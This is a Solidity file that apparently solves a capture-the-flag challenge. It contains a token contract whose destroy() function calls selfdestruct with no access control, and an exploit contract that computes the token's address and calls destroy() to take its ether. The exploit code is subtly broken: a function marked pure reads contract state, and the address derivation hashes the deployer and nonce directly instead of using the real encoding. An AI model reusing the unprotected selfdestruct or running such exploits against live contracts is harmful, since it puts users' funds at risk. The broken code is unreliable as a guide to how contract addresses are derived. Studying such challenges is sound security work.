pragma solidity ^0.8.0;

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryExploit {
    address public recoveryInstance;

    constructor(address _recoveryInstance) {
        recoveryInstance = _recoveryInstance;
    }

    function calculateTokenAddress() public pure returns (address) {
        address deployer = recoveryInstance;
        uint256 nonce = 1;
        uint256 extended = uint256(uint160(deployer)) + nonce;
        bytes32 hash = keccak256(abi.encodePacked(deployer, nonce));
        return address(uint160(bytes20(hash)));
    }

    function attack() public {
        ISimpleToken token = ISimpleToken(calculateTokenAddress());
        token.destroy(payable(address(this)));
    }

    receive() external payable {}
}
